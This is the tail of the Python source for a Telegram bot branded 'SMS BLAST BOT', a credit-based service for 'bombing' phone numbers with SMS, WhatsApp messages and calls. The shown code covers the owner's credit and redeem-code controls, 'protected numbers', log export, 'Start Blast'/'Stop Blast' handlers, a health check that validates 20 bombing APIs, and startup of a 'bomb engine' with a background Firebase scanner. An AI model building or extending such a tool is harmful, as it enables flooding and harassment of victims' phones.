            btn("✅ YES, DEDUCT", "owner:deduct_all_yes", EMOJI_CHECK, "✅"),
            btn("❌ NO, CANCEL", "owner:home", EMOJI_CROSS, "❌")
        ]
    ])
    await msg.answer(
        q(
            f"{em(EMOJI_WARNING, '⚠️')} <b>CONFIRMATION REQUIRED</b>\n\n"
            f"Kya aap sach mein sabhi users se <b>{amount}</b> credits deduct/reset karna chahte hain?"
        ),
        reply_markup=confirm_kb,
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:deduct_all_yes")
async def owner_deduct_all_yes_handler(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    data = await state.get_data()
    amount = data.get("deduct_all_amount", 0)
    await state.clear()
    users = d.get("users", {})
    if not users:
        await safe_edit(cq.message, f"{em(EMOJI_CROSS, '❌')} Koi user nahi hai!", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        return
    count = 0
    total_deducted = 0
    owners = d.get("owners", [MAIN_OWNER])
    admins = d.get("admins", [])
    for uid_str, udata in users.items():
        user_id = int(uid_str)
        if user_id in owners or user_id in admins:
            continue
        current = udata.get("credits", 0)
        manual_added = udata.get("manual_added_credits", 0)
        safe_limit = manual_added
        deductible_pool = max(0, current - safe_limit)
        if deductible_pool > 0:
            to_deduct = min(amount, deductible_pool)
            if to_deduct > 0:
                udata["credits"] = current - to_deduct
                count += 1
                total_deducted += to_deduct
    save(d)
    await safe_edit(cq.message,
        f"{em(EMOJI_CHECK, '✅')} <b>Credits Deducted Successfully!</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Deducted Amount: <b>{amount}</b>\n"
        f"{em(EMOJI_STAR, '👥')} Total users affected: <b>{count}</b>\n"
        f"{em(EMOJI_MONEY, '💳')} Total deducted: <b>{total_deducted}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

# ===== RESTORED FROM ORIGINAL SRC =====

@R.callback_query(F.data == "user:random_video")
async def user_trigger_video(cq: CallbackQuery, state: FSMContext):
    d = load()
    videos = d.get("videos", [])
    if not videos:
        await cq.answer("❌ Abhi koi media available nahi hai!", show_alert=True)
        return
    await cq.answer("📤 Sending...")
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy!")

@R.callback_query(F.data == "owner:protected_remove")
async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return

    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.answer("❌ Koi protected number nahi hai!", show_alert=True)
        return

    rows = []
    for number, protector_uid in protected.items():
        rows.append([btn(number, f"owner:protected_del:{number}", EMOJI_CROSS, "🗑")])

    rows.append([btn("ʙᴀᴄᴋ", "owner:protected_list", EMOJI_GEAR, "🔙")])

    await safe_edit(cq.message, 
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Protected Number</b>\n\nKaunsa number protection hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:protected_del:"))
async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return

    number = cq.data.split("owner:protected_del:", 1)[1]

    if number in d.get("protected_numbers", {}):
        del d["protected_numbers"][number]
        save(d)
        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = d["protected_numbers"]
        await cq.answer(f"✅ Protection removed for {number}!", show_alert=True)
    else:
        await cq.answer("❌ Number not found!", show_alert=True)

    await owner_protected_list(cq, state)

@R.callback_query(F.data == "owner:redeem:remove_credits:menu")
async def owner_redeem_remove_credits_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})
    if not codes:
        await cq.answer("❌ Koi code nahi hai!", show_alert=True)
        return

    rows = []
    for code, cdata in list(codes.items())[:20]:
        used_count = len(cdata.get("used_by", []))
        label = f"{code} ({used_count} users)"
        rows.append([btn(label, f"owner:redeem:rmcredits:confirm:{code}", EMOJI_MONEY, "💸", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙")])

    await safe_edit(cq.message, 
        f"{em(EMOJI_MONEY, '💸')} <b>Remove Credits Added By Redeem Code</b>\n\n"
        f"<i>Ye us code se jitne bhi users ne credits liye hain, unse woh credits wapas le lega.</i>\n\n"
        f"Kaunsa code select karein?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:redeem:rmcredits:confirm:"))
async def owner_redeem_remove_credits_confirm(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    code = cq.data.split("owner:redeem:rmcredits:confirm:", 1)[1]
    codes = d.get("redeem_codes", {})
    if code not in codes:
        await cq.answer("❌ Code nahi mila!", show_alert=True)
        return

    cdata = codes[code]
    used_by = cdata.get("used_by", [])
    credits_per_user = cdata.get("credits", 0)

    await safe_edit(cq.message, 
        f"{em(EMOJI_WARNING, '⚠️')} <b>Confirm Remove Credits</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Code: <code>{code}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Credits per user: <b>{credits_per_user}</b>\n"
        f"{em(EMOJI_STAR, '👥')} Affected users: <b>{len(used_by)}</b>\n\n"
        f"<b>Ye action un sabhi users se {credits_per_user} credits wapas le lega "
        f"jinhone ye code redeem kiya tha. Ye undo nahi ho sakta!</b>\n\n"
        f"Confirm karein?",
        reply_markup=kb(
            [("✅ Haan, Remove Karo", f"owner:redeem:rmcredits:do:{code}")],
            [("❌ Cancel", "owner:redeem:menu")]
        ),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:redeem:rmcredits:do:"))
async def owner_redeem_remove_credits_do(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    code = cq.data.split("owner:redeem:rmcredits:do:", 1)[1]
    await cq.answer("⏳ Processing...")

    def _remove(d):
        codes = d.get("redeem_codes", {})
        if code not in codes:
            return None
        cdata = codes[code]
        used_by = list(cdata.get("used_by", []))
        credits_per_user = cdata.get("credits", 0)
        affected = []
        for uid in used_by:
            k = str(uid)
            if k in d.get("users", {}):
                current = d["users"][k].get("credits", 0)
                new_val = max(0, current - credits_per_user)
                deducted = current - new_val
                d["users"][k]["credits"] = new_val
                if deducted > 0:
                    affected.append((uid, deducted, new_val))
        # clear the used_by list + reset uses_left so code can be reused cleanly if desired
        cdata["used_by"] = []
        return {"affected": affected, "credits_per_user": credits_per_user}

    result = atomic_update(_remove)

    if result is None:
        await safe_edit(cq.message, 
            f"{em(EMOJI_CROSS, '❌')} Code nahi mila ya already processed!",
            reply_markup=kb([(f"{sc('back')}", "owner:redeem:menu")]),
            parse_mode="HTML"
        )
        return

    affected = result["affected"]

    notified = 0
    for uid, deducted, new_val in affected:
        try:
            await cq.bot.send_message(
                uid,
                f"{em(EMOJI_WARNING, '⚠️')} <b>Credits Adjusted</b>\n\n"
                f"Redeem code <code>{code}</code> se mile <b>{deducted}</b> credits wapas le liye gaye hain.\n"
                f"{em(EMOJI_MONEY, '💳')} New Balance: <b>{new_val}</b>",
                parse_mode="HTML"
            )
            notified += 1
        except:
            pass
        await asyncio.sleep(0.05)

    await safe_edit(cq.message, 
        f"{em(EMOJI_CHECK, '✅')} <b>Credits Removed!</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Code: <code>{code}</code>\n"
        f"{em(EMOJI_STAR, '👥')} Users Affected: <b>{len(affected)}</b>\n"
        f"{em(EMOJI_BELL, '📨')} Notified: <b>{notified}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.message(Command("logs"))
async def cmd_logs(msg: Message, state: FSMContext):
    """
    Compact export — only:
      1. Users who are currently members of the required Force-Join channels
      2. Users who received manually-added credits (via /addcredit or owner:credits:add)
    Kept small and quick to generate/read (no full DB dump).
    """
    await state.clear()
    uid = msg.from_user.id
    d = load()
    if not is_owner(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Owner only!", parse_mode="HTML")
        return

    wait = await msg.answer(f"{em(EMOJI_GEAR, '⏳')} Generating compact log...", parse_mode="HTML")

    log_lines = []
    log_lines.append("=" * 60)
    log_lines.append("  SMS BLAST BOT - COMPACT LOG EXPORT")
    log_lines.append(f"  Exported by: {uid} | Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    log_lines.append("=" * 60)
    log_lines.append("")

    users = d.get("users", {})

    # ── Section 1: Force-Join channel members ──────────────────
    fj = d.get("force_join", {})
    channels = fj.get("channels", [])
    log_lines.append("[FORCE JOIN CHANNELS]")
    log_lines.append(f"Enabled: {fj.get('enabled', False)} | Channels: {len(channels)}")
    for ch in channels:
        log_lines.append(f"  - {ch.get('title', 'Channel')} (ID: {ch.get('id')})")
    log_lines.append("")

    fj_member_lines = []
    if fj.get("enabled") and channels:
        checked = 0
        for uid_str in users:
            try:
                target_uid = int(uid_str)
            except ValueError:
                continue
            is_member_of_all = True
            joined_channels = []
            for ch in channels:
                if not ch.get("required", True):
                    continue
                ok = await check_membership(msg.bot, target_uid, ch["id"])
                if ok:
                    joined_channels.append(ch.get("title", "Channel"))
                else:
                    is_member_of_all = False
            if joined_channels:
                udata = users[uid_str]
                fj_member_lines.append(
                    f"  UID: {uid_str} | Name: {udata.get('name', 'Unknown')} | "
                    f"Joined: {', '.join(joined_channels)}{' (ALL)' if is_member_of_all else ' (PARTIAL)'}"
                )
            checked += 1
            if checked % 20 == 0:
                await asyncio.sleep(0.5)   # throttle to stay under Telegram's rate limits

    log_lines.append(f"[FORCE JOIN MEMBERS] Total: {len(fj_member_lines)}")
    log_lines.extend(fj_member_lines if fj_member_lines else ["  (none)"])
    log_lines.append("")

    # ── Section 2: Manually credited users ──────────────────────
    manual_lines = []
    for uid_str, udata in users.items():
        manual_amt = udata.get("manual_added_credits", 0)
        if manual_amt and manual_amt > 0:
            manual_lines.append(
                f"  UID: {uid_str} | Name: {udata.get('name', 'Unknown')} | "
                f"Manual Credits: {manual_amt} | Current Balance: {udata.get('credits', 0)}"
            )

    log_lines.append(f"[MANUALLY CREDITED USERS] Total: {len(manual_lines)}")
    log_lines.extend(manual_lines if manual_lines else ["  (none)"])
    log_lines.append("")

    log_lines.append("=" * 60)
    log_lines.append("  END OF COMPACT LOG")
    log_lines.append("=" * 60)

    log_text = "\n".join(log_lines)

    from aiogram.types import BufferedInputFile
    file_bytes = io.BytesIO(log_text.encode("utf-8"))
    file_bytes.name = f"compact_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

    try:
        await wait.delete()
    except Exception:
        pass

    await msg.answer_document(
        document=BufferedInputFile(file_bytes.getvalue(), filename=file_bytes.name),
        caption=(
              f"{em(EMOJI_GEAR, '📜')} <b>Compact Log Export</b>\n"
              f"{em(EMOJI_CHECK, '✅')} Force-Join Members: <b>{len(fj_member_lines)}</b>\n"
              f"{em(EMOJI_MONEY, '💰')} Manually Credited: <b>{len(manual_lines)}</b>\n"
              f"{em(EMOJI_GEAR, '📅')} Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        ),
        parse_mode="HTML"
    )


# ===================== DUAL UI SWITCH + REPLY BUTTONS =====================

@R.callback_query(F.data == "switch:reply")
async def cb_back_to_reply(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    await show_reply(cq.bot, cq.message.chat.id, uid, f"{em(EMOJI_CHECK, '✅')} {pf('switched to reply mode')}", default_reply_keyboard())
    await cq.answer("Reply mode active")

@R.message(F.text.in_({"🔀 Switch to Inline", "Switch to Inline", pf("Switch to Inline")}))
async def cb_switch_inline(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    d = load()
    if is_owner(uid, d):
        kb, hdr = owner_kb(d), owner_panel_text(d)
    elif is_admin(uid, d):
        kb, hdr = admin_kb(d), admin_panel_text(d)
    else:
        if is_banned(uid, d) or not can_use(uid, d):
            await msg.answer(q(f"{em(EMOJI_CROSS, '⛔')} Access denied."), parse_mode="HTML")
            return
        kb, hdr = user_kb(), user_home_text(uid, d)
    await show_inline(msg.bot, msg.chat.id, uid, hdr, kb)

@R.message(F.text.in_({"🚀 Start Blast", "Start Blast", pf("Start Blast")}))
async def reply_start_blast(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    if get_ui_mode(uid) == "inline":
        return
    d = load()
    if is_banned(uid, d) or (not can_use(uid, d) and not is_owner(uid, d) and not is_admin(uid, d)):
        await msg.answer(q(f"{em(EMOJI_CROSS, '⛔')} Access denied."), parse_mode="HTML")
        return
    await show_inline(
        msg.bot, msg.chat.id, uid,
        f"{em(EMOJI_BOMB, '💥')} <b>{pf('bomb mode')}</b>\n\nMode select karo:",
        bomb_mode_kb()
    )

@R.message(F.text.in_({"📹 Videos", "Videos", pf("Videos")}))
async def reply_videos(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    if get_ui_mode(uid) == "inline":
        return
    d = load()
    videos = d.get("videos", [])
    if not videos:
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} No media yet."), parse_mode="HTML")
        return
    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy!")

@R.message(F.text.in_({"💰 Credits", "Credits", pf("Credits")}))
async def reply_credits(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    if get_ui_mode(uid) == "inline":
        return
    d = load()
    cr = get_user_credits(uid, d)
    await msg.answer(q(f"{em(EMOJI_MONEY, '💳')} Your credits: <b>{cr}</b>"), parse_mode="HTML", reply_markup=default_reply_keyboard())

@R.message(F.text.in_({"🛑 Stop Blast", "Stop Blast", pf("Stop Blast")}))
async def reply_stop_blast(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid)
        if not session or (session.task and session.task.done()):
            await msg.answer(q(f"{em(EMOJI_CHECK, '✅')} No active sending."), parse_mode="HTML")
            return
        session.cancelled = True
    await msg.answer(q(f"{em(EMOJI_CROSS, '🛑')} Stop signal sent."), parse_mode="HTML")

@R.message(F.text.in_({"🎁 Referral", "Referral", pf("Referral")}))
async def reply_referral(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    if get_ui_mode(uid) == "inline":
        return
    d = load()
    code = generate_user_refer_code(uid, d)
    save(d)
    me = await msg.bot.get_me()
    link = f"https://t.me/{me.username}?start={code}"
    await msg.answer(
        q(f"{em(EMOJI_GIFT, '🎁')} Your referral:\n<code>{code}</code>\n{link}"),
        parse_mode="HTML",
        reply_markup=default_reply_keyboard()
    )

# Note: dual-UI exclusivity is enforced by show_inline/show_reply + switch handlers.
# Stale reply-keyboard taps while in inline mode are ignored in reply_* handlers via get_ui_mode check.

# ===================== HEALTH CHECK =====================

async def health_check(bot: Bot, dp: Dispatcher = None) -> dict:
    report = {"ok": True, "checks": {}}

    # 1) Bot identity
    try:
        me = await asyncio.wait_for(bot.get_me(), timeout=5)
        ok = bool(me and me.is_bot and me.username)
        report["checks"]["bot_token"] = {
            "status": "ok" if ok else "fail",
            "detail": f"@{me.username}" if ok else "invalid bot"
        }
        if not ok:
            report["ok"] = False
    except Exception as e:
        report["checks"]["bot_token"] = {"status": "fail", "detail": str(e)[:80]}
        report["ok"] = False
        return report

    # 2) Owner / log channel
    owner_ok = isinstance(MAIN_OWNER, int) and MAIN_OWNER > 0
    report["checks"]["owner"] = {
        "status": "ok" if owner_ok else "fail",
        "detail": f"MAIN_OWNER={MAIN_OWNER}"
    }
    if not owner_ok:
        report["ok"] = False

    try:
        await asyncio.wait_for(bot.get_chat(LOG_CHANNEL_ID), timeout=5)
        report["checks"]["log_channel"] = {"status": "ok", "detail": str(LOG_CHANNEL_ID)}
    except Exception as e:
        report["checks"]["log_channel"] = {"status": "warn", "detail": str(e)[:80]}

    # 3) Handlers / commands / states (offline)
    expected_callbacks = [
        "user:send", "user:stop_send", "user:bomb:sms", "user:bomb:wa",
        "user:bomb:call", "user:bomb:all", "user:home", "user:credits",
        "owner:home", "owner:send", "owner:fb:menu:0", "owner:fb:extract_active",
        "owner:api:menu", "owner:backup:menu", "owner:monitor", "owner:videos:menu",
        "admin:home", "admin:send", "switch:reply", "fj:check"
    ]
    # We cannot easily introspect filter strings; mark as ok if router has handlers
    handler_count = 0
    try:
        if dp is not None:
            for observer in getattr(dp, "observers", {}).values() if hasattr(dp, "observers") else []:
                handler_count += len(getattr(observer, "handlers", []) or [])
            # aiogram 3: walk routers
            def _count(r):
                n = 0
                for attr in ("message", "callback_query", "edited_message"):
                    obs = getattr(r, attr, None)
                    if obs and hasattr(obs, "handlers"):
                        n += len(obs.handlers)
                for sub in getattr(r, "sub_routers", []) or []:
                    n += _count(sub)
                return n
            handler_count = _count(dp) + _count(R)
        report["checks"]["handlers"] = {
            "status": "ok" if handler_count > 20 else "warn",
            "detail": f"{handler_count} handlers registered",
            "missing": []
        }
    except Exception as e:
        report["checks"]["handlers"] = {"status": "warn", "detail": str(e)[:60], "missing": []}

    expected_states = [
        "send_number", "send_message", "send_speed", "send_count",
        "bomb_number", "bomb_message", "bomb_speed", "bomb_count",
        "extract_active_text", "api_test_number"
    ]
    present = set()
    try:
        for name, val in S.__dict__.items():
            if isinstance(val, State):
                present.add(name)
    except Exception:
        pass
    missing_states = [s for s in expected_states if s not in present]
    report["checks"]["states"] = {
        "status": "ok" if not missing_states else "warn",
        "missing": missing_states
    }

    # 4) Firebase config
    d = load()
    fbs = d.get("firebases", [])
    fb_issues = []
    urls = set()
    for fb in fbs:
        u = (fb.get("url") or "").rstrip("/")
        if not u.startswith("http"):
            fb_issues.append(f"bad url: {u[:40]}")
        if u in urls:
            fb_issues.append(f"dup: {u[:40]}")
        urls.add(u)
    report["checks"]["firebases"] = {
        "status": "ok" if not fb_issues else "warn",
        "count": len(fbs),
        "issues": fb_issues[:5]
    }

    # 5) JSON keys
    required = [
        "owners", "admins", "banned", "users", "firebases", "stats",
        "pricing", "redeem_codes", "settings", "videos", "backup",
        "bomb_stats", "api_health", "api_enabled", "mode_costs"
    ]
    missing_keys = [k for k in required if k not in d]
    report["checks"]["json_db"] = {
        "status": "ok" if not missing_keys else "warn",
        "missing_keys": missing_keys
    }

    # 6) BOMB_APIS
    invalid = []
    if len(BOMB_APIS) != 20:
        invalid.append(f"count={len(BOMB_APIS)} expected 20")
    for a in BOMB_APIS:
        if not a.get("name") or a.get("type") not in ("SMS", "WhatsApp", "Call"):
            invalid.append(a.get("name", "?"))
            continue
        url = a.get("url")
        try:
            if callable(url):
                url("9999999999")
        except Exception as e:
            invalid.append(f"{a.get('name')}:url:{e}")
    report["checks"]["apis"] = {
        "status": "ok" if not invalid else "warn",
        "invalid": invalid[:8]
    }

    # 7) Reply keyboard structure
    try:
        rkb = default_reply_keyboard()
        assert rkb.keyboard and all(isinstance(row, list) for row in rkb.keyboard)
        report["checks"]["reply_keyboard"] = {"status": "ok", "detail": "structure valid"}
    except TypeError:
        report["checks"]["reply_keyboard"] = {"status": "warn", "detail": "Bot API 9.4 style not supported — fallback"}
    except Exception as e:
        report["checks"]["reply_keyboard"] = {"status": "warn", "detail": str(e)[:60]}

    any_fail = any(c.get("status") == "fail" for c in report["checks"].values())
    report["ok"] = report["ok"] and not any_fail
    return report

@R.message(Command("health"))
async def cmd_health(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await msg.answer(q(f"{em(EMOJI_CROSS, '❌')} Owner only."), parse_mode="HTML")
        return
    wait = await msg.answer(q(f"{em(EMOJI_GEAR, '⏳')} Running health check..."), parse_mode="HTML")
    report = await health_check(msg.bot)
    lines = [f"{em(EMOJI_CHECK if report['ok'] else EMOJI_CROSS, '✅' if report['ok'] else '❌')} <b>Health</b> — {'OK' if report['ok'] else 'ISSUES'}\n"]
    for k, v in report["checks"].items():
        st = v.get("status", "?")
        icon = {"ok": "✅", "warn": "⚠️", "fail": "❌"}.get(st, "•")
        detail = v.get("detail") or v.get("missing") or v.get("missing_keys") or v.get("issues") or v.get("invalid") or ""
        lines.append(f"{icon} <b>{k}</b>: {st} {detail}")
    try:
        await wait.delete()
    except Exception:
        pass
    await msg.answer(q("\n".join(lines)), parse_mode="HTML")

# ===================== MAIN =====================

async def main():
    if not BOT_TOKEN:
        log.error("BOT_TOKEN is empty — set it before starting.")
        import sys
        sys.exit(1)
    _ka_port = _start_keepalive()
    log.info(f"Keep-alive server on port {_ka_port}")
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)

    # Health check (non-blocking on warns)
    try:
        report = await health_check(bot, dp)
        log.info("HEALTH: %s", json.dumps(report, indent=2, default=str)[:2000])
        if report["checks"].get("bot_token", {}).get("status") == "fail":
            log.error("Critical: bot token invalid — exiting")
            import sys
            sys.exit(1)
        passed = sum(1 for c in report["checks"].values() if c.get("status") == "ok")
        total = len(report["checks"])
        try:
            await bot.send_message(
                MAIN_OWNER,
                q(
                    f"🚀 <b>SMS BLAST BOT {_VERSION} — ONLINE</b>\n"
                    f"{SEP_THICK}\n"
                    f"🏥 Health: <b>{passed}/{total}</b> checks passed\n"
                    f"🕐 <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n"
                    f"{SEP_DOT}\n"
                    f"🔄 Scanner + Backup ready | 💥 Bomb engine on\n"
                    f"🎯 Dual UI active\n"
                    f"{SEP_THIN}\n"
                    f"👤 Owner: {SUPER_ADMIN_NAME}"
                ),
                parse_mode="HTML"
            )
            fails = [k for k, v in report["checks"].items() if v.get("status") == "fail"]
            warns = [k for k, v in report["checks"].items() if v.get("status") == "warn"]
            if fails or warns:
                await bot.send_message(
                    MAIN_OWNER,
                    q(f"⚠️ Health notes\nFails: {fails or '—'}\nWarns: {warns or '—'}"),
                    parse_mode="HTML"
                )
        except Exception as e:
            log.warning(f"Owner notify: {e}")
    except Exception as e:
        log.error(f"health_check error: {e}")

    scanner_task = asyncio.create_task(background_firebase_scanner(bot))
    backup_task = asyncio.create_task(background_backup_sender(bot))
    log.info("Background scanner & backup tasks created")

    try:
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    finally:
        scanner_task.cancel()
        backup_task.cancel()
        await asyncio.gather(scanner_task, backup_task, return_exceptions=True)
        log.info("Background tasks cancelled — bot stopped cleanly")

if __name__ == "__main__":
    asyncio.run(main())
